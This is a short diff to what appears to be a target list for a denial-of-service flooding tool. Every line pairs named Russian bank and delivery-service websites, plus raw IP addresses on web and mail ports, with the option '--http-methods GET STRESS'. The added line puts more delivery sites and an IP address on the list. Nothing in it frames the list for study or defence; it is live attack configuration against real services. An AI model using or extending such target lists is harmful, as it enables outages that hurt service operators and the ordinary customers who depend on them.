@@ -1,3 +1,5 @@
+https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com http://128.140.175.200:80 https://128.140.175.200:443 --http-methods GET STRESS
+
 https://alfabank.ru https://vtb.ru https://online.vtb.ru/login https://login.avangard.ru https://www.tinkoff.ru/ --http-methods GET STRESS
 
 https://193.222.109.135:443 https://193.222.109.11:443 https://193.222.109.82:2001 tcp://217.12.96.27:25 tcp://217.12.96.18:25 tcp://217.12.97.18:25 tcp://193.164.146.180:25 tcp://193.164.146.181:25 tcp://193.164.146.179:25 tcp://195.242.83.129:8008 tcp://193.222.109.99:443 --http-methods GET STRESS
